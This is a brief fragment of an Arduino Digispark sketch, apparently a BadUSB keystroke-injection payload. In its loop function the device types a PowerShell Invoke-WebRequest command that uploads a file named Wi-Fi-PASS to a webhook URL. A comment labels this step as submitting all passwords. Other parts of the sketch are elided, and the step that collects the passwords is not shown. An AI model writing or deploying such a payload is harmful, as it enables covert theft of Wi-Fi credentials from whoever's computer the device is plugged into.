...
void loop() {
  ...
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri [URL Here! Example: https://webhook.site/???????????] -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
